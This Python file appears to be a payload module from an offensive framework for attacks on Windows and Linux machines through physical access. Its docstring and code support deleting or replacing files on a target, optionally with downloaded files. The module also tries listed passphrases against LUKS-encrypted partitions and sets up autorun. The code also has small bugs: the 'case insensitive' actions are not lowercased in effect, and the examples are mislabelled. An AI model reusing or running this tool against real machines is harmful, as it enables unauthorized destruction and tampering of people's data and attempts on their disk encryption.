"""
Manipulate files on disk
FILES must be in this format:
    <pattern to find file>:<action>:<action args>;<pattern to find file>:<action>:<action args>;...
    All actions but replace_online support directories as well
    Actions are (case insensitive):
        delete:
            Delete files or directories
            <pattern to find file>:delete:
            Example:
                Delete a single file:
                    /home/user/info.txt:delete:
                Delete all files matched by pattern:
                    /home/user/*.txt:delete:
        replace:
            Replaces target file with a file from your machine
            <pattern to find file>:replace:<file to replace with>
            Example:
                Replace a single file:
                    /home/user/info.txt:replace:new_info.txt
                Replace all files matched by pattern:
                    /home/user/*.txt:replace:new_info.txt
        replace_local:
            Replaces target file with a file from the target machine
            <pattern to find file>:replace_local:<local file to replace with>
            Example:
                Replace a single file:
                    /home/user/info.txt:replace:/home/user2/info.txt
                Replace all files matched by pattern:
                    /home/user/*.txt:replace:/home/user2/bad_info.txt
            
        replace_online:
            Replaces target file with a file from the internet. Note that only files served over http or https are supported.
            <pattern to find file>:replace_online:<URL>
            Example:
                Replace a single file:
                    /home/user/info.txt:replace_online:https://example.com/my_info.txt
                Replace all files matched by pattern:
                    /home/user/*.txt:replace_online:https://example.com/my_info.txt
            
"""
import os
import pathlib
import shutil
import urllib.parse

from snr.core.payload.payload import Context, Payload
from snr.core.util import download


class FilesPayload(Payload):
    AUTHORS = ("GlobularOne",)
    TARGET_OS_LIST = ("Microsoft Windows", "GNU/Linux")
    INPUTS = (
        ("FILES", [], -1, "Files to change", True),
        ("PASSPHRASES", [], -1, "Passphrases to try for LUKS-encrypted partitions"),
    )

    def generate(self, ctx: Context) -> int:
        variables = self.get_self_variables()
        # We need to do some processing of the FILES before passing it to the payload
        # Delete and replace_local actions require no processing,
        # but replace requires some copying and replace_online some downloading
        self.format_payload_and_write(ctx, variables)
        assert isinstance(variables["FILES"], list)
        files: list[str] = variables["FILES"]
        processed_files: list[str] = []
        counter = 0
        data_dir = ctx.join("root", "data")
        os.makedirs(data_dir)
        for file in files:
            pattern, action, arg = file.split(":", maxsplit=2)
            action.lower()
            match action:
                case "delete":
                    processed_files.append(":".join([pattern, action, arg]))
                case "replace_local":
                    processed_files.append(":".join([pattern, action, arg]))
                case "replace":
                    # Copy the file to the host filesystem and rewrite the arg
                    new_arg = str(counter) + pathlib.Path(arg).suffix
                    if os.path.isdir(arg):
                        shutil.copytree(arg, os.path.join(data_dir, new_arg))
                    else:
                        shutil.copy(arg, os.path.join(data_dir, new_arg))
                    counter += 1
                    processed_files.append(
                        ":".join([pattern, action, os.path.join("data", new_arg)]))
                case "replace_online":
                    new_arg = str(
                        counter) + pathlib.Path(urllib.parse.urlparse(arg).path).suffix
                    download.download(arg, os.path.join(data_dir, new_arg))
                    processed_files.append(
                        ":".join([pattern, "replace", os.path.join("data", new_arg)]))
        self.add_autorun(ctx)
        return 0


payload = FilesPayload()
